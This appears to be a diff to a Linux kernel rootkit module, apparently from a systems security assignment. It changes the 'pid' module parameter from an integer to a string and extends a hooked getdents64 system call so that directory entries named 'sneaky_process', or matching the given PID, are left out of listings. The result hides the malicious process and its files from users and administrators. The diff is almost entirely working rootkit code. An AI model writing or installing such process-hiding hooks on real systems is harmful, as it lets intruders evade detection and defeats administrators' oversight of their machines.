@@ -12,10 +12,10 @@
 
 #define PREFIX "sneaky_process"
 
-static int pid;
-module_param(pid, int, 0);
-// char *sneaky_pid = NULL;
-// module_param(sneaky_pid, charp, 0);
+//static int pid;
+//module_param(pid, int, 0);
+char *pid = NULL;
+module_param(pid, charp, 0);
 
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -75,7 +75,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
   for (off = 0; off < nread;)
   {
     struct linux_dirent64 *curDirent = (void *)dirp + off;
-    if (strcmp(curDirent->d_name, "sneaky_process") == 0)
+    if ((strcmp(curDirent->d_name, "sneaky_process") == 0) || (strcmp(curDirent->d_name, pid) == 0))
     {
       void *nextDirent = (void *)curDirent + curDirent->d_reclen;
       int remaining_size = nread - (off + curDirent->d_reclen);
